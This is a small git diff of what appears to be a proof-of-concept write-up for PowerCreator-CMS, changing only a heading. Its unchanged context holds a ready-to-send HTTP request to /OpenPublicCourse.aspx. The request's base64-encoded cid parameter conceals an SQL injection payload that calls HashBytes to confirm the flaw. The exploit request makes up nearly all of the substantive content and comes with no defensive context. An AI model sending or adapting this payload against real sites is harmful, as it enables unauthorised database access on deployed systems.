@@ -10,7 +10,7 @@ app="PowerCreator-CMS"
 
 ![image](https://github.com/user-attachments/assets/fcc5c0c8-6a56-42a0-9aba-0d65b1d63a56)
 
-## poc
+## POC
 
 ```yaml
 GET /OpenPublicCourse.aspx?cid=NSBhbmQgMT1zeXMuZm5fc3FsdmFyYmFzZXRvc3RyKEhhc2hCeXRlcygnTUQ1JywnMTIzNDU2JykpLS0%3D HTTP/1.1
